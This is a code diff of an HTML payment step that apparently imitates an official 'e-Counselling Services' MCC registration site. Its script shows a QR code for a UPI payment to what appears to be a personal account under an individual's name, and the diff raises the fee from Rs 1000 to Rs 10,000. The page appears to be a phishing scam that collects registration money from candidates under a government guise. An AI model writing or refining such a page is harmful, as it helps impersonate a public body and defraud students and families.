@@ -13,77 +13,13 @@
         border-radius: 18px;
         padding: 30px 30px 18px;
       }
-      .qr-header {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 18px;
-        margin-bottom: 24px;
-      }
-      .qr-avatar {
-        width: 64px;
-        height: 64px;
-        border-radius: 50%;
-        display: grid;
-        place-items: center;
-        background: #5a3b2e;
-        color: #fff;
-        font-size: 2.1rem;
-        font-weight: 700;
-      }
-      .qr-merchant-name {
-        font-size: clamp(2.2rem, 3vw, 3rem);
-        font-weight: 700;
-        color: #1f2430;
-        letter-spacing: -0.04em;
-      }
-      .qr-box {
-        width: min(520px, 82vw);
-        margin: 0 auto;
-        border-radius: 18px;
-        padding: 18px;
-        background: #fff;
-        border: 1px solid #dfe5ea;
-        box-shadow: inset 0 0 0 1px rgba(0,0,0,0.01);
-      }
-      .qr-box img {
-        display: block;
-        width: 100%;
-        height: auto;
-        max-width: 520px;
-        max-height: 520px;
-        margin: 0 auto;
-        background: #fff;
-      }
-      .upi-id-label {
-        margin-top: 18px;
-        text-align: center;
-        font-size: clamp(1.35rem, 2vw, 2rem);
-        font-weight: 500;
-        color: #1f2430;
-      }
-      .upi-id-label strong {
-        font-weight: 700;
-      }
-      .scan-pay-label {
-        margin-top: 26px;
-        text-align: center;
-        font-size: clamp(1.1rem, 1.8vw, 2.1rem);
-        color: #2b3745;
-      }
-      @media (max-width: 620px) {
-        .qr-merchant {
-          padding: 20px 14px 12px;
-        }
-        .qr-header {
-          gap: 10px;
-        }
-        .qr-avatar {
-          width: 48px;
-          height: 48px;
-          font-size: 1.7rem;
-        }
-      }
+      .qr-header { display:flex; align-items:center; justify-content:center; gap:18px; margin-bottom:24px; }
+      .qr-avatar { width:64px; height:64px; border-radius:50%; display:grid; place-items:center; background:#5a3b2e; color:#fff; font-size:2.1rem; font-weight:700; }
+      .qr-merchant-name { font-size:clamp(2.2rem,3vw,3rem); font-weight:700; color:#1f2430; }
+      .qr-box { width:min(520px,82vw); margin:0 auto; border-radius:18px; padding:18px; background:#fff; border:1px solid #dfe5ea; }
+      .qr-box img { display:block; width:100%; height:auto; max-width:520px; max-height:520px; margin:0 auto; background:#fff; }
+      .upi-id-label { margin-top:18px; text-align:center; font-size:clamp(1.35rem,2vw,2rem); font-weight:500; color:#1f2430; }
+      .scan-pay-label { margin-top:26px; text-align:center; font-size:clamp(1.1rem,1.8vw,2.1rem); color:#2b3745; }
     </style>
   </head>
   <body>
@@ -97,10 +33,7 @@
         </div>
       </div>
       <div class="gov-right">
-        <div class="e-counselling">
-          <div class="e-badge">e</div>
-          <div class="e-text">Counselling Services</div>
-        </div>
+        <div class="e-counselling"><div class="e-badge">e</div><div class="e-text">Counselling Services</div></div>
       </div>
     </header>
 
@@ -117,7 +50,7 @@
           <div class="login-card">
             <div class="login-header">
               <h1>Step 4 — Payment</h1>
-              <button type="button" class="secure-btn">Rs 1000</button>
+              <button type="button" class="secure-btn">Rs 10,000</button>
             </div>
 
             <div class="qr-merchant">
@@ -136,7 +69,7 @@
             <div class="scan-pay-label">Scan to pay with any UPI app</div>
 
             <div class="registration-actions">
-              <a href="step3.html" class="secondary-btn">Back</a>
+              <a href="choices.html" class="secondary-btn">Back</a>
               <button id="confirmPayment" class="primary-btn" type="button">I have paid</button>
             </div>
           </div>
@@ -160,13 +93,13 @@
     <script>
       (function(){
         const roll = JSON.parse(localStorage.getItem('mcc_registration_roll') || 'null') || '';
-        const amount = '1000.00';
+        const amount = '10000.00';
         const upiId = 'seemapandeyqwerty@okicici';
         const name = 'Seema Pandey';
         const note = encodeURIComponent('MCC Registration ' + roll);
         const upiLink = 'upi://pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&am=' + amount + '&cu=INR&tn=' + note;
 
-        // Use a QR generator that reliably returns an image in browsers
+        // Use a reliable QR generator
         const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=600x600&data=' + encodeURIComponent(upiLink);
         document.getElementById('paymentQr').src = qrUrl;
 
